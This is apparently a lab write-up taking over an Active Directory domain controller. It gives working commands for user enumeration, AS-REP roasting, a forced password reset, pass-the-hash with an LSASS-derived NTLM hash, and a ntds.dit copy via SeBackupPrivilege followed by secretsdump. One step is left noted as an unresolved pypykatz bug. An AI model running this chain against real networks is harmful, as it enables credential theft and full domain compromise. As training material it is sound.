![[Pasted image 20250422184620.png]]
then with [[nmap]] report we see [[port 445]] open, that is for [[Server message Block (SMB)]] protocol, let's try list shared resources with [[smbmap]]
![[Pasted image 20250422184957.png]]
We find some folders. With `smbmap` we can read directly a folder, let's try see inside `profiles$`

```bash
smbmap -H 10.10.10.192 -u entr0phy4 -r profiles$
```
![[Pasted image 20250422185228.png]]
and we got a list of possible users valid, lets play with [[awk]] to get only the name of the user
so have a list of possible users we can use a tools as [[kerbrute]] to try [[Brute force]] attack.
first, we need the domain of the [[Domain Controller (DC)]], user [[netexec]] can visualize that

![[Pasted image 20250422185936.png]]

then:
```bash
kerbrute userenum --dc 10.10.10.192 -d blackfield.local ./data/users
```
and we get:
```bash
[+] VALID USERNAME:	audit2020@blackfield.local
[+] VALID USERNAME:	support@blackfield.local
[+] VALID USERNAME:	svc_backup@blackfield.local
```
this valid users. Now, having a valid users list we can try [[AS-REP Roasting]] attack using [[GetNPUsers.py]] function of [[Impacket]].
```bash
GetNPUsers.py blackfield.local/ -no-pass -usersfile ./data/users:valid
```
![[Pasted image 20250422191921.png]]
we got a hash of user `support`, lets try with [[JohnTheRipper]] crack that hash.
![[Pasted image 20250422191959.png]]
and we have the first credentials. `#00^BlackKnight`
with [[netexec]] we can validate that credentials.
![[Pasted image 20250422192632.png]]
and are corrects.
we can user [[ldapdomaindump]] to try get information by [[LDAP]].

```bash
ldapdomaindump -u 'blackfield.local\support' -p '#00^BlackKnight' 10.10.10.192
```

now, we can user [[Neo4j]] and [[bloodhound]] to try to enumerate more things.

first is start `neo4j` 
```bash
sudo neo4j console 
```

second step is use [[bloodhound-python]] tool to try enumerate the domain in remote with credential valid we have.
```bash
bloodhound-python -c all -u 'support' -p '#00^BlackKnight' -ns 10.10.10.192 -d blackfield.local 
```

now, with all files of output by `bloodhound-python` upload to [[bloodhound]]
In `INBOUND OBJECT CONTROL`  we see this:
![[Pasted image 20250422204817.png]]
user `support` can force change password to user `audit20202`

with [[net]] via [[RPC]] we can do that.
```bash
net rpc password audit2020 -U 'support' -S 10.10.10.192
```

![[Pasted image 20250422205238.png]]
and works, u can validate that with [[netexec]]
![[Pasted image 20250422205258.png]]

try list again shared resources with [[smbmap]] we get access to folder `foresic`

![[Pasted image 20250422205614.png]]
and in memory_analysis:
![[Pasted image 20250422205814.png]]
we focus our attention to `lsass.zip`
download the zip file:
```bash
smbmap -H 10.10.10.192 -u 'audit2020' -p 'test123!@#' --download forensic/memory_analysis/lsass.zip
```
and check it's a [[Mini DuMP]] file of [[LSASS]]
let's use [[pypykatz]] the try visualize privilege information.
```bash
pypykatz lsa minidump lsass.DMP
```

... **bug pypykatz** ...

but with [[pypykatz]] you should can get the [[NTML]] of `svc-backup` user and user [[evil-winrm]] to connect

![[Pasted image 20250422210314.png]]
checking we found the users of [[Remote Management Users]] group
![[Pasted image 20250422201549.png]]

```bash
evil-winrm -i 10.10.10.192 -u svc_backup -H 9658d1d1dcd9250115e2205d9f48400d
```

once inside, enumerate our privileges
```bash
whoami /priv
```

![[Pasted image 20250422230001.png]]
So let's try abuse [[SeBackupPrivilege]] using [[diskshadow.exe]]
first we need create a new alias to can have access to [[ntds.dit]]

```powershell
set context persistent nowriters 
add volume c: alias test
create 
expose %test% z: 
```
with this script on the target machine we can use [[diskshadow.exe]]
![[Pasted image 20250422232849.png]]
and works.
Now we can user a new logic volume created `z:\` to get [[ntds.dit]]
using [[robocopy]]
```powershell
robocopy /b z:\Windows\NTDS\ . ntds.dit
```

![[Pasted image 20250422233654.png]]
we have a copy, just need download it to your machine.
```powershell
download ntds.dit
```
you also need create a copy of system with [[reg]]
```powershell
reg save HKLM\system system
```
and download it, having this and the ntds.dit file on you machine can use [[secretdump.py]] of [[Impacket]] to dump hashes of all users.
```bash
secretsdump.py -system ./content/system -ntds ./content/ntds.dit LOCAL

```
![[Pasted image 20250423000507.png]]
and with that hast we can use [[evil-winrm]] again to enter as `Administrator` user
![[Pasted image 20250423000630.png]]